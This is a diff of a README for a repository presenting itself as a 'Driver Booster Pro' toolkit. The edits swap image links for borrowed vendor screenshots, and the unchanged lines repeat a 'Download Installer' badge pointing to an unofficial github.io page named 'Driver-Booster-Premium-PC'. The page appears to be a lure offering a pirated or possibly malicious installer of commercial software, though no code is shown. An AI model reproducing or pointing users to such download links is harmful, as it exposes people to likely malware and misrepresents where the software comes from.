@@ -1,7 +1,7 @@
 # Driver Booster Pro Driver Management Toolkit
 
 <div align="center">
-<img src="https://cdn.comss.ru/img/112025/iobit-driver1.png?class=cover" alt="Driver Booster Pro Logo" width="550">
+<img src="https://www.iobit.com/tpl/images/screenshot/db/scaning_117.png" alt="Driver Booster Pro Logo" width="550">
 </div>
 
 [![Download Installer](https://img.shields.io/badge/Download_Installer-005999?style=flat-square&logo=windows&logoColor=white)](https://albertoleonardwdks.github.io/.github/Driver-Booster-Premium-PC)
@@ -25,7 +25,7 @@ Driver Booster Pro integrates naturally into Windows administration routines and
 ---
 
 <div align="center">
-<img src="screenshot-placeholder.png" alt="Driver Booster Pro Screenshot" width="800">
+<img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcS3JDwIldErDTR_3iGMCPA0tCj0XsPxGqWUolciXw7qTcUWtEZXbDCVOe0&s=10" alt="Driver Booster Pro Screenshot" width="800">
 </div>
 
 [![Download Installer](https://img.shields.io/badge/Download_Installer-005999?style=flat-square&logo=windows&logoColor=white)](https://albertoleonardwdks.github.io/.github/Driver-Booster-Premium-PC)
